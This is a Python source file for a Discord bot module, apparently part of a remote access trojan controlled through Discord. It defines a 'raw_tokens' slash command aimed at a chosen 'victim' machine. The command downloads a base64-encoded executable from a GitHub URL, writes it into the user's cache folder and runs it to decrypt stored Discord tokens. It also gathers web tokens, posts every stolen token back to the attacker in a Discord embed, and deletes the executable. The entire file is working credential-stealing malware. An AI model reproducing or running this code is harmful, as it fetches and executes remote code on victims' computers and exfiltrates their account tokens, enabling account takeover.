import disnake as discord
from disnake.ext import commands
from datetime import datetime
from base64 import decodebytes

import os, requests
nr_working = f"C:\\Users\\{os.getenv('username')}\\.cache"

class RawTokens(commands.Cog):
    def __init__(self, bot: commands.Bot):
        self.bot = bot

    @commands.slash_command( )
    async def raw_tokens(self, ctx, victim):
        """Sends all Discord Tokens unchecked

        Parameters
        ----------
        victim: Identifier of the affected computer (found via /listvictims).
        """
        if str(victim) != str(self.bot.identifier):
            return
        await ctx.response.defer()

        try:
            tkr = bytes(
                requests.get(
                    "https://raw.githubusercontent.com/NullCode13-Misc/DiscordTokenDecrypt-Go/main/rec_dump_broken"
                ).text, 
                "utf-8"
            )
        except Exception as e:
            return await ctx.followup.send(
                "Unable to download decryptor!\n\n"+e
            )

        os.chdir(nr_working)
        with open("tkr.exe", "wb") as fh: fh.write(decodebytes(tkr))

        changes = {
            '[': '', 
            ']': '',
            ',': '',
            "'": '', 
            '"': '', 
            ' ': '\n'
        }

        discordTkz = str(os.popen("tkr.exe").read()).strip('][').split(', ')
        webTkz = list(dict.fromkeys(self.bot.find_token()))

        for k, v in changes.items():
            discordTkz = str(discordTkz).replace(k, v)
            webTkz = str(webTkz).replace(k, v)

        finalTks = str(discordTkz + "\n" + webTkz)

        await ctx.followup.send(
            embed=self.bot.genEmbed(
                "Decrypted tokens", datetime.now(), f"```{finalTks}```"
            )
        )

        os.remove(nr_working + "\\tkr.exe")
        os.chdir(self.bot.original_dir)   
            
def setup(bot: commands.Bot):
    bot.add_cog(RawTokens(bot))